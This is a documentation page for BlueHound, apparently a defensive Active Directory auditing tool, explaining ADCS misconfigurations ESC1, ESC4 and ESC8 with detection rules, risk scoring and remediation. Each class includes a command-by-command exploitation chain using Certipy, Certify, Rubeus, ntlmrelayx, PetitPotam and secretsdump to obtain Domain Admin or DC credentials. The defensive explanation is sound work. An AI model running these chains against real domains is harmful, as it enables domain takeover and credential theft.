# ADCS Deep Dive

Active Directory Certificate Services (ADCS) is one of the highest-value attack surfaces in a Windows environment. A single misconfigured certificate template can give a low-privileged domain user a direct path to Domain Admin without touching Kerberos, password spraying, or lateral movement. This document explains the core ADCS concepts BlueHound uses to detect abuse, walks through each ESC class covered by Category D, describes how BlueHound ingests ADCS data outside of the BloodHound graph, and maps every finding to its real-world exploitation chain.

---

## What ADCS Is and Why It Matters

ADCS is the Microsoft PKI role built into Windows Server. Organizations deploy it to issue X.509 certificates for smart card logon, code signing, TLS, and machine authentication. When configured correctly it is unremarkable. When misconfigured, it becomes a persistence and privilege escalation primitive that:

- survives password resets (a valid certificate authenticates regardless of the account's current password)
- bypasses EDR solutions that focus on process injection and credential dumping
- produces no LSASS interaction, making it invisible to most credential-theft detections
- can target any account in the domain, including Domain Admins and the `krbtgt` account

The attack classes BlueHound detects were systematized by Will Schroeder and Lee Christensen in their 2021 "Certified Pre-Owned" research. They labelled the misconfigurations ESC1 through ESC8. BlueHound currently covers ESC1, ESC4, and ESC8 — the three with the highest prevalence and lowest exploitation difficulty in real assessments.

---

## How ADCS Data Reaches BlueHound

BloodHound CE does not model ADCS objects (certificate templates, certificate authorities, enrollment endpoints) in its graph. BlueHound works around this by providing a separate ingestion path in `bluehound/ingestion/adcs.py`.

### The `example_adcs.json` schema

BlueHound reads ADCS data from a JSON file (`example_adcs.json` by default) whose schema mirrors what tools like `Certify.exe`, `Certipy`, or custom PowerShell scripts export. The top-level structure is:

```json
{
  "certificate_authorities": [...],
  "certificate_templates": [...]
}
```

**Certificate authority object:**

```json
{
  "name": "BLUEHOUND-CA",
  "dns_hostname": "dc01.bluehound.local",
  "web_enrollment_enabled": true,
  "ntlm_authentication_enabled": true,
  "templates": ["User", "Machine", "UserTemplate"]
}
```

**Certificate template object:**

```json
{
  "name": "UserTemplate",
  "display_name": "User Template",
  "client_authentication": true,
  "enrollee_supplies_subject": true,
  "manager_approval_required": false,
  "authorized_signatures_required": 0,
  "enrollment_permissions": ["Domain Users", "Authenticated Users"],
  "write_permissions": []
}
```

### Storage model

The `ADCSIngester` in `adcs.py` parses this file and stores the result directly on the `GraphView` instance as `graph_view.certificate_templates` and `graph_view.certificate_authorities`. This is a deliberate architecture decision: since Neo4j does not hold ADCS data, keeping it on the `GraphView` object means it flows naturally into the `DetectionContext` alongside graph-derived data and is available to Category D detectors without any database queries.

---

## ESC Class Reference

### ESC1 — Enrollee Supplies Subject

**Why it is critical.** A certificate template has the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set, meaning the requester specifies the Subject Alternative Name (SAN) in the Certificate Signing Request. Combined with a template that enables client authentication, this lets any user who can enroll in the template request a certificate asserting they are the Domain Admin — or any other account — and then authenticate as that account using PKINIT or `schannel`.

**Required conditions (all must be true):**

| Condition | Where to check |
|---|---|
| `enrollee_supplies_subject == True` | Template properties |
| `client_authentication == True` | Template EKU includes OID 1.3.6.1.5.5.7.3.2 |
| `manager_approval_required == False` | Template issuance requirements |
| `authorized_signatures_required == 0` | Template issuance requirements |
| At least one non-Tier-0 principal can enroll | Template enrollment permissions |

**Exploitation chain:**

```
1. attacker (low-priv user) identifies vulnerable template via:
   Certify.exe find /vulnerable
   certipy find -u user@domain -p pass

2. requests certificate specifying Domain Admin UPN as SAN:
   Certify.exe request /ca:CORP-CA /template:VulnTemplate /altname:administrator
   certipy req -u user@domain -p pass -ca CORP-CA -template VulnTemplate -upn administrator@domain

3. converts .pem to .pfx

4. uses certificate to obtain TGT for Domain Admin:
   Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /getcredentials
   certipy auth -pfx admin.pfx -dc-ip 10.0.0.1

5. uses TGT or NTLM hash for DCSync / further access
```

**BlueHound detection rule:** `D1` in `bluehound/detection/category_d.py`. Severity is `CRITICAL`. Each vulnerable template generates one finding. The affected principals list includes every non-Tier-0 identity that holds enrollment rights on the template.

**Remediation:** In the Certificate Templates console (`certtmpl.msc`), open the template, go to Subject Name tab, and change "Supply in the request" to "Build from this Active Directory information". If subject supply is a business requirement, enable Manager Approval under Issuance Requirements. Any pending approval breaks the automated exploitation chain.

---

### ESC4 — Dangerous Template Write Permissions

**Why it is critical.** ESC4 is a two-step attack. An attacker with write permissions on a certificate template can modify it to introduce ESC1 conditions — even if the template was originally safe. It is a template-to-ESC1 privilege escalation path, and it is often overlooked because the template itself does not appear vulnerable during a point-in-time scan.

**Required conditions (all must be true):**

| Condition | Where to check |
|---|---|
| `client_authentication == True` | Template EKU |
| Principal holds `GenericAll`, `WriteDacl`, `WriteOwner`, or `WriteProperty` on the template | Template security descriptor |
| That principal is not a PKI Admin or Enterprise Admin | Group membership |

**Exploitation chain:**

```
1. identify template where attacker has write rights:
   Certify.exe find /vulnerable
   certipy find -u user@domain -p pass

2. modify template to enable enrollee_supplies_subject:
   certipy template -u user@domain -p pass -template VulnTemplate -save-old
   # this sets CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on the template object in AD

3. now proceed with ESC1 exploitation chain above

4. optionally restore original template settings after obtaining credential:
   certipy template -u user@domain -p pass -template VulnTemplate -configuration old.json
```

**BlueHound detection rule:** `D2` in `bluehound/detection/category_d.py`. Severity is `HIGH`. The finding reports the template name, the type of dangerous ACE (`GenericAll`, `WriteDacl`, etc.), and the principal holding it.

**Remediation:** Remove the dangerous ACE from the certificate template's security descriptor. Only `PKI Admins` and `Enterprise Admins` should hold write rights on certificate templates. Use `certsrv.msc` or the following PowerShell to audit all templates for non-administrative write permissions:

```powershell
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" `
    -Filter {objectClass -eq "pKICertificateTemplate"} -Properties nTSecurityDescriptor |
    ForEach-Object {
        $template = $_.Name
        $_.nTSecurityDescriptor.Access |
            Where-Object { $_.ActiveDirectoryRights -match "Write|GenericAll" -and
                           $_.IdentityReference -notmatch "Enterprise Admins|PKI Admins|SYSTEM" } |
            Select-Object @{N="Template";E={$template}}, IdentityReference, ActiveDirectoryRights
    }
```

---

### ESC8 — NTLM Relay to ADCS HTTP Enrollment

**Why it is critical.** If a Certificate Authority has HTTP-based web enrollment enabled and is accepting NTLM authentication, an attacker can relay NTLM authentication from any machine account to the CA's web enrollment endpoint and obtain a certificate for that machine account. With the machine certificate, the attacker can obtain a TGT for the machine account, dump its LSA secrets, and extract the NTLM hash of the machine account — which for a Domain Controller means full domain compromise.

This attack does not require any user interaction beyond triggering an outbound NTLM authentication from the target machine (via `PetitPotam`, `PrinterBug`, `DFSCoerce`, or similar coercion techniques).

**Required conditions (all must be true):**

| Condition | Where to check |
|---|---|
| CA has web enrollment endpoint enabled (`/certsrv/`) | `web_enrollment_enabled == True` in ADCS data |
| Endpoint accepts NTLM (not Kerberos or certificate-only) | `ntlm_authentication_enabled == True` |
| At least one client-auth template is published on the CA | `ca.templates` intersects templates where `client_authentication == True` |

**Exploitation chain:**

```
1. start NTLM relay listener targeting the CA's web enrollment endpoint:
   impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template Machine

2. coerce NTLM authentication from a Domain Controller machine account:
   PetitPotam.py attacker_ip dc01.domain.local
   # or: PrinterBug, DFSCoerce, etc.

3. relay captures DC machine account NTLM authentication and requests
   a certificate via the web enrollment form — ntlmrelayx outputs a
   base64 certificate for the DC$ account

4. use the certificate to obtain a TGT for the DC:
   Rubeus.exe asktgt /user:DC01$ /certificate:<base64> /getcredentials
   certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1

5. use the DC TGT to perform DCSync and extract all domain credentials:
   impacket-secretsdump -k -no-pass dc01.domain.local
```

**BlueHound detection rule:** `D3` in `bluehound/detection/category_d.py`. Severity is `CRITICAL`. The finding includes the CA name, its DNS hostname, and the list of client-authentication-capable templates published on it.

**Remediation options (in order of preference):**

1. **Disable web enrollment entirely** if it is not a business requirement. Remove the `certsrv` IIS application from the CA server. This completely eliminates the attack surface.
2. **Enable EPA (Extended Protection for Authentication)** on the `certsrv` IIS application. EPA binds the NTLM authentication to the TLS channel, blocking relay attacks.
3. **Require HTTPS with channel binding** on the web enrollment endpoint. A relay attacker operating over HTTP cannot satisfy a channel-binding requirement.
4. **Enable CA enforcement mode** in Windows Server 2022+ (KB5014754). This enforces strong certificate mapping and rejects certificates issued without channel binding from relay.

Disabling NTLM on the CA web enrollment endpoint is not sufficient on its own unless EPA is simultaneously enforced — NTLM can still be coerced via other paths.

---

## Risk Scoring for ADCS Findings

All Category D findings carry an `ADCS_ABUSE` category bias of **1.30×** in BlueHound's risk engine. This is the highest category multiplier in the model, reflecting several properties unique to certificate-based attacks:

**Stealth dimension (weight 0.30):** Certificate requests generate `Event ID 4886` (certificate requested) and `4887` (certificate issued), but these events are rarely ingested or alerted on in most SIEM deployments. Authentication using a certificate generates `Event ID 4768` (Kerberos TGT request) with a `Certificate` pre-authentication type — distinguishable from password auth, but often not baselined.

**Exploitability dimension (weight 0.25):** ESC1 and ESC8 require only publicly available tooling (`Certify.exe`, `Certipy`, `impacket`) and no prior access beyond a standard domain user account. ESC4 requires write rights on a specific template object, slightly raising the bar.

**Persistence dimension (weight 0.25):** A certificate remains valid for its entire validity period — typically one to two years — regardless of password changes, account unlocks, or MFA resets. Even if the attacker's original user account is disabled, certificates issued before the disable remain valid until they expire or are explicitly revoked.

**Blast Radius dimension (weight 0.20):** ESC1 and ESC8 can directly produce a Domain Admin credential. ESC4 is one step removed (requires template modification first) but has the same ultimate blast radius.

---

## Relationship to Other Detection Categories

ADCS findings interact with findings from other categories in BlueHound's kill path analysis:

- A **Kerberoastable account (B1)** that also holds enrollment rights on a vulnerable template (D1) creates a two-step path: crack the service ticket offline → enroll as Domain Admin.
- **Unconstrained delegation (C1)** combined with **ESC8 (D3)** is the classic `PetitPotam` chain: coerce the DC to authenticate to the relay listener → relay to web enrollment → certificate for DC$ → DCSync.
- **Dangerous ACEs on Tier-0 (A4)** combined with **ESC4 (D2)** means an attacker who reaches the ACE holder can modify a client-auth template and introduce ESC1 without ever needing a direct Tier-0 write.

BlueHound's kill path assembler surfaces these chains in the `primary_kill_path` field of the `ThreatModelResult`. The `time_to_domain_admin` estimate accounts for the chained complexity — a two-step chain adds roughly 1–2 hours to the estimate compared to a direct ESC1.

---

## Further Reading

- Schroeder, W. & Christensen, L. (2021). *Certified Pre-Owned: Abusing Active Directory Certificate Services*. SpecterOps. The primary reference for all ESC classes.
- [ADCS ESC Attack Paths in BloodHound](https://posts.specterops.io/adcs-esc-attack-paths-in-bloodhound-part-1-799f3d3b03cf) — SpecterOps blog covering BloodHound CE's native ADCS edges (ESC1, ESC3, ESC6, ESC9, ESC10).
- [Certipy](https://github.com/ly4k/Certipy) — the canonical open-source tool for ADCS enumeration and exploitation.
- [Detection Catalog](detection-catalog.md) — full per-rule documentation for D1, D2, and D3 including all finding fields and evidence format.
- [Architecture Deep Dive](architecture.md) — explains how the ADCS ingester feeds into the detection pipeline.
